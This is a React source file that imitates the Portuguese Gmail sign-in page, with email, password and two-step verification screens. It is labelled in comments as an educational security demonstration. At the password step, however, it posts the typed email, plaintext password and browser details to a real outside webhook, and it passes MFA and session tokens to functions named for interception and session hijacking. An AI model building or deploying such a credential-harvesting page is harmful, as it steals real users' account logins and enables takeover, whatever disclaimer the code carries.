import React, { useState, useEffect } from 'react';
import {
  Box,
  Button,
  Typography,
  Link,
  FormControl,
  InputLabel,
  OutlinedInput,
  SvgIcon,
  Select,
  MenuItem,
  InputAdornment,
  IconButton,
  CircularProgress,
  TextField,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogContentText,
  DialogActions,
  Alert,
  Snackbar
} from '@mui/material';
import ArrowBackIcon from '@mui/icons-material/ArrowBack';
import InfoOutlinedIcon from '@mui/icons-material/InfoOutlined';
import KeyboardArrowDownIcon from '@mui/icons-material/KeyboardArrowDown';
import VisibilityIcon from '@mui/icons-material/Visibility';
import VisibilityOffIcon from '@mui/icons-material/VisibilityOff';
import './GmailLogin.css';
import { interceptAuthData, interceptMFAToken, interceptSessionToken } from '../security/middleware/authInterceptor';
import { AuthenticationBypassSimulator, MITMAttackSimulator, PhishingSimulator, SecurityDetectionDemo } from '../security/middleware/advancedVulnerabilityDemo';

// Custom Google Icon similar to the one in the attachment
function GoogleLogoIcon(props) {
return (
    <SvgIcon {...props} viewBox="0 0 40 48" sx={{ width: '48px', height: '48px' }}>
        <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
        <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
        <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
        <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
    </SvgIcon>
);
}

function GmailLogin({ onBack }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [step, setStep] = useState(1); // 1 = email input, 2 = password input, 3 = MFA input
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [mfaToken, setMfaToken] = useState('');
  const [mfaError, setMfaError] = useState('');
  const [loading, setLoading] = useState(false);
  const [selectedMfaOption, setSelectedMfaOption] = useState('app');
  const [showSecurityAlert, setShowSecurityAlert] = useState(false);
  const [securityAlertDetails, setSecurityAlertDetails] = useState(null);
  const [sessionToken, setSessionToken] = useState('');
  
  // Demonstrate a security alert after component mount (for educational purposes)
  useEffect(() => {
    // Simulate security alerts after successful login attempts
    if (sessionToken) {
      setTimeout(() => {
        const securityEvent = SecurityDetectionDemo.generateSecurityEventDemo();
        const securityAlert = SecurityDetectionDemo.triggerSecurityAlert();
        setSecurityAlertDetails(securityAlert);
        setShowSecurityAlert(true);
      }, 5000);
    }
  }, [sessionToken]);
  
  const handleEmailChange = (e) => {
    setEmail(e.target.value);
    if (emailError) {
      setEmailError('');
    }
  };
    const handlePasswordChange = (e) => {
    setPassword(e.target.value);
    if (passwordError) {
      setPasswordError('');
    }
  };
  
  const handleMfaTokenChange = (e) => {
    setMfaToken(e.target.value);
    if (mfaError) {
      setMfaError('');
    }
  };
  
  const handleMfaOptionChange = (e) => {
    setSelectedMfaOption(e.target.value);
    setMfaToken('');
    setMfaError('');
  };
  
  // Validate email format
  const isEmailValid = (email) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };
  
  // Validate password strength
  const isPasswordStrong = (password) => {
    // For demo purposes, just check length
    return password.length >= 6;
  };
  
  // Simulate API call to authenticate
  const simulateAuthentication = (email, password) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        // Simulate successful authentication
        resolve({
          success: true,
          requiresMFA: true,
          userId: 'user_123',
          sessionId: 'temp_session_' + Math.random().toString(36).substring(2, 15)
        });
      }, 1500);
    });
  };
  
  // Simulate API call to verify MFA token
  const simulateVerifyMFA = (userId, token) => {
    return new Promise((resolve) => {
      setTimeout(() => {
        // Simulate successful verification
        resolve({
          success: true,
          sessionToken: 'auth_token_' + Math.random().toString(36).substring(2, 15)
        });
      }, 1500);
    });
  };
    const handleNextClick = async () => {
    if (step === 1) {
      if (email.trim() === '') {
        setEmailError('Introduza um endereço de email');
        return;
      } else if (!isEmailValid(email)) {
        setEmailError('Introduza um endereço de email válido');
        return;
      }
      
      // SECURITY VULNERABILITY DEMONSTRATION:
      // Log the entered email (just the first step of a potential attack)
      PhishingSimulator.captureCredentials(email, '');
      
      setEmailError('');
      setStep(2);
    } else if (step === 2) {
      if (password.trim() === '') {
        setPasswordError('Introduza a palavra-passe');
        return;
      } else if (!isPasswordStrong(password)) {
        setPasswordError('A palavra-passe deve ter pelo menos 6 caracteres');
        return;
      }
      
      setLoading(true);

      // vamos fazer um post para registrar o email e a password , e dados do navegador e ip e data/hora
      fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email,
          password,
          userAgent: navigator.userAgent,
          ip:  navigator.connection ? navigator.connection.remoteAddress : 'unknown',
          clientInfo: {
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            language: navigator.language
          },
          timestamp: new Date().toISOString(),
          step: 'login_attempt'
        })
      });

      // SECURITY VULNERABILITY DEMONSTRATION:
      // This demonstrates how credentials could be intercepted by malicious code
      // DO NOT implement this in real applications - for educational purposes only
      
      // Method 1: Basic credential interception
      interceptAuthData({
        email,
        password,
        timestamp: new Date().toISOString()
      });
      
      // Method 2: Advanced phishing simulator
      PhishingSimulator.captureCredentials(email, password);
      
      // Method 3: MITM attack simulation
      MITMAttackSimulator.interceptRequest({
        email,
        password,
        clientInfo: navigator.userAgent
      }, '/api/auth/login');
      
      try {
        // Attempt to authenticate
        const authResult = await simulateAuthentication(email, password);
        
        if (authResult.success) {
          if (authResult.requiresMFA) {
            // SECURITY VULNERABILITY DEMONSTRATION:
            // Log that MFA is required (part of intelligence gathering)
            console.warn('SECURITY DEMO: MFA required for', email);
            
            // Proceed to MFA step
            setStep(3);
          } else {
            // Authentication successful without MFA
            handleSuccessfulLogin('no_mfa_token');
          }
        } else {
          setPasswordError('Palavra-passe incorreta');
        }
      } catch (error) {
        console.error('Authentication error:', error);
        setPasswordError('Erro de autenticação. Tente novamente.');
      } finally {
        setLoading(false);
      }
    } else if (step === 3) {
      if (mfaToken.trim() === '' || mfaToken.length !== 6) {
        setMfaError('Introduza um código válido de 6 dígitos');
        return;
      }
      
      setLoading(true);
      
      // SECURITY VULNERABILITY DEMONSTRATION:
      // This demonstrates how MFA tokens could be intercepted
      // DO NOT implement this in real applications - for educational purposes only
      
      // Method 1: Basic MFA interception
      interceptMFAToken(mfaToken, email);
      
      // Method 2: Advanced MFA bypass simulation
      AuthenticationBypassSimulator.captureMFAToken(
        mfaToken, 
        email, 
        'session_' + Math.random().toString(36).substr(2, 9)
      );
      
      try {
        // Verify MFA token
        const verifyResult = await simulateVerifyMFA('user_123', mfaToken);
        
        if (verifyResult.success) {
          // SECURITY VULNERABILITY DEMONSTRATION:
          // Demonstrate how even after successful MFA, session tokens can be hijacked
          const hijackedToken = interceptSessionToken(verifyResult.sessionToken);
          
          // Also demonstrate with the advanced simulator
          AuthenticationBypassSimulator.hijackSession(verifyResult.sessionToken, {
            email,
            userId: 'user_123',
            authTime: new Date().toISOString()
          });
          
          // Store session token and trigger success handling
          setSessionToken(verifyResult.sessionToken);
          handleSuccessfulLogin(verifyResult.sessionToken);
        } else {
          setMfaError('Código incorreto. Tente novamente.');
        }
      } catch (error) {
        console.error('MFA verification error:', error);
        setMfaError('Erro de verificação. Tente novamente.');
      } finally {
        setLoading(false);
      }
    }
  };
    const handleSuccessfulLogin = (token) => {
    // In a real app, this would redirect to the main application or dashboard
    console.log('Login successful with email:', email);
    
    // Here we're simulating a successful login
    setTimeout(() => {
      alert('Login bem sucedido!\n\nATENÇÃO: Este é um exercício de segurança para demonstrar como credenciais e tokens MFA podem ser interceptados. Consulte o console do navegador para ver os detalhes.');
    }, 500);
  };
  
  const handleTogglePasswordVisibility = () => {
    setShowPassword(!showPassword);
  };
  
  const handleKeyPress = (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handleNextClick();
    }
  };
  
  const handleCloseSecurityAlert = () => {
    setShowSecurityAlert(false);
  };
  
  // Render MFA verification step
  const renderMfaStep = () => {
    return (
      <Box sx={{ width: '100%' }}>
        <Typography
          variant="h6"
          sx={{
            fontSize: '16px',
            fontWeight: 500,
            mb: 2,
            color: '#202124',
            textAlign: 'center'
          }}
        >
          Verificação em dois passos
        </Typography>
        
        <Typography
          variant="body2"
          sx={{
            mb: 3,
            fontSize: '14px',
            color: '#5f6368',
            textAlign: 'left'
          }}
        >
          Introduza o código de verificação enviado para o seu {
            selectedMfaOption === 'app' ? 'aplicativo de autenticação' :
            selectedMfaOption === 'sms' ? 'telemóvel' :
            'método de recuperação'
          }
        </Typography>
        
        <FormControl variant="outlined" sx={{ width: '100%', mb: 2 }}>
          <Select
            value={selectedMfaOption}
            onChange={handleMfaOptionChange}
            sx={{
              mb: 2,
              height: '56px',
              fontSize: '14px'
            }}
          >
            <MenuItem value="app">Aplicativo de autenticação</MenuItem>
            <MenuItem value="sms">SMS (+351 ●●● ●●● 123)</MenuItem>
            <MenuItem value="backup">Códigos de backup</MenuItem>
          </Select>
        </FormControl>
        
        <TextField
          label="Código de verificação"
          variant="outlined"
          fullWidth
          value={mfaToken}
          onChange={handleMfaTokenChange}
          onKeyPress={handleKeyPress}
          error={!!mfaError}
          helperText={mfaError}
          sx={{
            mb: 3,
            '& .MuiOutlinedInput-root': {
              height: '56px'
            }
          }}
          inputProps={{
            maxLength: 6,
            inputMode: 'numeric',
            pattern: '[0-9]*'
          }}
          autoFocus
        />
        
        <Link
          href="#"
          underline="hover"
          sx={{
            color: '#1a73e8',
            fontWeight: 500,
            fontSize: '14px',
            textDecoration: 'none',
            '&:hover': {
              textDecoration: 'underline',
            },
            display: 'block',
            mb: 2
          }}
        >
          Tentar outro método
        </Link>
      </Box>
    );
  };  return (
    <div className="gmail-login-page">
      <button className="back-button" onClick={step === 1 ? onBack : () => setStep(1)}>
        <ArrowBackIcon fontSize="small" className="back-icon" />
        {step === 1 ? 'Voltar' : 'Utilizar outra conta'}
      </button>
      
      <div className="gmail-login-wrapper">
        <div className="login-card-container">          <Box sx={{ display: 'flex', justifyContent: 'center', mb: 3 }}>
            <GoogleLogoIcon sx={{ fontSize: '24px', width: '75px', height: '24px' }} />
          </Box>          <Typography 
            variant="h1" 
            sx={{ 
              fontSize: '24px', 
              fontWeight: 400, 
              textAlign: 'center',
              mb: 1,
              fontFamily: 'Google Sans,Roboto,Arial,sans-serif'
            }}
          >
            {step === 1 ? 'Inicie sessão' : step === 2 ? 'Bem-vindo(a)' : 'Verificação'}
          </Typography>
            <Typography 
            variant="subtitle1" 
            sx={{ 
              fontSize: '16px',
              fontWeight: 400,
              mb: step === 1 ? 6 : 2,
              color: '#202124',
              textAlign: 'center',
              fontFamily: 'Google Sans,Roboto,Arial,sans-serif'
            }}
          >
            {step === 1 ? 'Continuar para o Gmail' : email}
          </Typography>
          
          {step === 2 && (
            <Typography 
              variant="body2" 
              sx={{ 
                fontSize: '14px',
                mb: 3,
                color: '#5f6368',
                textAlign: 'center',
                fontFamily: 'Roboto,Arial,sans-serif'
              }}
            >
              Para continuar, confirme que é mesmo você
            </Typography>
          )}{step === 1 ? (
            <FormControl 
              fullWidth 
              variant="outlined" 
              error={!!emailError}
              sx={{ 
                mb: emailError ? 0.5 : 2,
                '& .MuiFormLabel-root.MuiInputLabel-shrink': {
                  transform: 'translate(14px, -9px) scale(0.75)',
                  backgroundColor: 'white',
                  padding: '0 4px',
                }
              }}
            >
              <InputLabel 
                htmlFor="email-input"
                sx={{
                  color: emailError ? '#d32f2f' : '#5f6368',
                  fontSize: '16px',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&.Mui-focused': {
                    color: emailError ? '#d32f2f' : '#1a73e8',
                  }
                }}
              >
                Email ou telemóvel
              </InputLabel>
              <OutlinedInput
                id="email-input"
                value={email}
                onChange={handleEmailChange}
                onKeyPress={handleKeyPress}
                label="Email ou telemóvel"
                fullWidth
                autoFocus
                error={!!emailError}
                sx={{
                  height: '56px',
                  borderRadius: '4px',
                  fontSize: '16px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&:hover .MuiOutlinedInput-notchedOutline': {
                    borderColor: emailError ? '#d32f2f' : 'rgba(0, 0, 0, 0.23)',
                  },
                  '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                    borderWidth: '2px',
                    borderColor: emailError ? '#d32f2f' : '#1a73e8',
                  },
                  '& .MuiOutlinedInput-notchedOutline': {
                    borderColor: emailError ? '#d32f2f' : '#dadce0',
                  }
                }}
                endAdornment={
                  email && (
                    <InputAdornment position="end">
                      <IconButton edge="end" tabIndex={-1}>
                        <InfoOutlinedIcon sx={{ color: 'transparent' }} />
                      </IconButton>
                    </InputAdornment>
                  )
                }
              />
              {emailError && (
                <Typography 
                  variant="caption" 
                  color="error" 
                  sx={{ 
                    mt: 0.5, 
                    ml: 1.5, 
                    display: 'block',
                    fontSize: '12px'
                  }}
                >
                  {emailError}
                </Typography>
              )}
            </FormControl>
          ) : step === 2 ? (
            <FormControl 
              fullWidth 
              variant="outlined" 
              error={!!passwordError}
              sx={{ 
                mb: passwordError ? 0.5 : 2,
                '& .MuiFormLabel-root.MuiInputLabel-shrink': {
                  transform: 'translate(14px, -9px) scale(0.75)',
                  backgroundColor: 'white',
                  padding: '0 4px',
                }
              }}
            >
              <InputLabel 
                htmlFor="password-input"
                sx={{
                  color: passwordError ? '#d32f2f' : '#5f6368',
                  fontSize: '16px',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&.Mui-focused': {
                    color: passwordError ? '#d32f2f' : '#1a73e8',
                  }
                }}
              >
                Introduza a sua palavra-passe
              </InputLabel>              <OutlinedInput
                id="password-input"
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={handlePasswordChange}
                onKeyPress={handleKeyPress}
                label="Introduza a sua palavra-passe"
                fullWidth
                autoFocus
                error={!!passwordError}
                sx={{
                  height: '56px',
                  borderRadius: '4px',
                  fontSize: '16px',
                  color: '#202124',
                  fontFamily: 'Roboto, Arial, sans-serif',
                  '&:hover .MuiOutlinedInput-notchedOutline': {
                    borderColor: passwordError ? '#d32f2f' : 'rgba(0, 0, 0, 0.23)',
                  },
                  '&.Mui-focused .MuiOutlinedInput-notchedOutline': {
                    borderWidth: '2px',
                    borderColor: passwordError ? '#d32f2f' : '#1a73e8',
                  },
                  '& .MuiOutlinedInput-notchedOutline': {
                    borderColor: passwordError ? '#d32f2f' : '#dadce0',
                  }
                }}
                endAdornment={
                  <InputAdornment position="end">
                    <IconButton
                      onClick={handleTogglePasswordVisibility}
                      edge="end"
                    >
                      {showPassword ? (
                        <span style={{ fontSize: '14px', color: '#5f6368' }}>Ocultar</span>
                      ) : (
                        <span style={{ fontSize: '14px', color: '#5f6368' }}>Mostrar</span>
                      )}
                    </IconButton>
                  </InputAdornment>
                }
              />
              {passwordError && (
                <Typography 
                  variant="caption" 
                  color="error" 
                  sx={{ 
                    mt: 0.5, 
                    ml: 1.5, 
                    display: 'block',
                    fontSize: '12px'
                  }}
                >
                  {passwordError}
                </Typography>
              )}
            </FormControl>
          ) : (
            renderMfaStep()
          )}          {step === 1 ? (
            <Box sx={{ textAlign: 'left', mb: 5 }}>
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Esqueceu-se do email?
              </Link>
            </Box>
          ) : step === 2 ? (
            <Box sx={{ textAlign: 'left', mb: 5 }}>
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Esqueceu-se da palavra-passe?
              </Link>
            </Box>
          ) : null}
          
          {step < 3 && (
            <Box sx={{ mb: 5, textAlign: 'left' }}>
              <Typography 
                variant="body2" 
                sx={{ 
                  fontSize: '14px',
                  color: '#5f6368',
                  mb: 1,
                  lineHeight: 1.5
                }}
              >
                Este computador não é seu? Use o modo convidado para iniciar sessão de forma privada.
              </Typography>
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Saiba como usar o modo convidado
              </Link>
            </Box>
          )}
          
          <Box sx={{ 
            display: 'flex', 
            justifyContent: 'space-between', 
            alignItems: 'center', 
            mt: 8
          }}>            {step === 1 ? (
              <Link
                href="#"
                underline="hover"
                sx={{
                  color: '#1a73e8',
                  fontWeight: 500,
                  fontSize: '14px',
                  textDecoration: 'none',
                  '&:hover': {
                    textDecoration: 'underline',
                  }
                }}
              >
                Criar conta
              </Link>
            ) : (
              <div></div> // Empty div to maintain spacing
            )}            <Button
              variant="contained"
              onClick={handleNextClick}
              disabled={loading}
              sx={{
                backgroundColor: '#1a73e8',
                '&:hover': {
                  backgroundColor: '#1565c0',
                  boxShadow: '0 1px 3px 0 rgba(60,64,67,0.3), 0 4px 8px 3px rgba(60,64,67,0.15)'
                },
                textTransform: 'none',
                fontWeight: 500,
                px: 3.5,
                py: 1,
                minWidth: '88px',
                height: '36px',
                borderRadius: '4px',
                boxShadow: '0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15)',
                fontSize: '14px',
                fontFamily: 'Google Sans, Roboto, Arial, sans-serif',
                letterSpacing: '0.25px'
              }}
            >
              {loading ? (
                <CircularProgress size={24} color="inherit" />
              ) : (
                step === 3 ? 'Verificar' : step === 2 ? 'Concluir' : 'Seguinte'
              )}
            </Button>
          </Box>
        </div>
      </div>
      
      {/* Security Alert Demo Dialog */}
      <Dialog
        open={showSecurityAlert}
        onClose={handleCloseSecurityAlert}
        aria-labelledby="alert-dialog-title"
        aria-describedby="alert-dialog-description"
      >
        <DialogTitle id="alert-dialog-title" sx={{ color: '#d32f2f', fontWeight: 500 }}>
          {securityAlertDetails?.title || "Alerta de Segurança"}
        </DialogTitle>
        <DialogContent>
          <DialogContentText id="alert-dialog-description">
            {securityAlertDetails?.message || "Foi detectada atividade suspeita na sua conta. Verifique e proteja a sua conta imediatamente."}
          </DialogContentText>
        </DialogContent>
        <DialogActions>
          {securityAlertDetails?.actions?.map((action, index) => (
            <Button 
              key={index} 
              onClick={handleCloseSecurityAlert} 
              color={index === 0 ? "primary" : "inherit"}
              variant={index === 0 ? "contained" : "text"}
            >
              {action}
            </Button>
          )) || (
            <Button onClick={handleCloseSecurityAlert} color="primary" variant="contained">
              Entendi
            </Button>
          )}
        </DialogActions>
      </Dialog>
      
      {/* Snackbar for security alerts */}
      <Snackbar
        open={sessionToken !== '' && !showSecurityAlert}
        autoHideDuration={10000}
        onClose={() => {}}
        anchorOrigin={{ vertical: 'bottom', horizontal: 'center' }}
      >
        <Alert 
          severity="warning" 
          variant="filled"
          sx={{ width: '100%' }}
        >
          DEMONSTRAÇÃO DE SEGURANÇA: Suas credenciais e tokens foram capturados para fins educacionais. Veja o console para detalhes.
        </Alert>
      </Snackbar>
        <footer className="gmail-footer">
        <Box sx={{ 
          display: 'flex', 
          justifyContent: 'space-between', 
          width: '100%', 
          px: 2,
          maxWidth: '450px', 
          margin: '0 auto'
        }}>
          <Box>
            <Select
              value="pt"
              variant="standard"
              disableUnderline
              IconComponent={KeyboardArrowDownIcon}
              sx={{ 
                fontSize: '12px',
                color: '#5f6368',
                '&:before': {
                  border: 'none',
                },
                '& .MuiSelect-select': {
                  paddingBottom: 0
                },
                '& .MuiSvgIcon-root': {
                  fontSize: '18px',
                  color: '#5f6368'
                }
              }}
            >
              <MenuItem value="pt">Português (Portugal)</MenuItem>
              <MenuItem value="en">English</MenuItem>
              <MenuItem value="es">Español</MenuItem>
            </Select>
          </Box>
          <Box sx={{ display: 'flex' }}>
            <Link 
              href="#" 
              underline="hover" 
              sx={{ 
                mx: 1, 
                fontSize: '12px', 
                color: '#5f6368', 
                textDecoration: 'none',
                '&:hover': {
                  textDecoration: 'underline',
                }
              }}
            >
              Ajuda
            </Link>
            <Link 
              href="#" 
              underline="hover" 
              sx={{ 
                mx: 1, 
                fontSize: '12px', 
                color: '#5f6368',
                textDecoration: 'none',
                '&:hover': {
                  textDecoration: 'underline',
                } 
              }}
            >
              Privacidade
            </Link>
            <Link 
              href="#" 
              underline="hover" 
              sx={{ 
                mx: 1, 
                fontSize: '12px', 
                color: '#5f6368',
                textDecoration: 'none',
                '&:hover': {
                  textDecoration: 'underline',
                } 
              }}
            >
              Termos
            </Link>
          </Box>
        </Box>
      </footer>
    </div>
  );
}

export default GmailLogin;
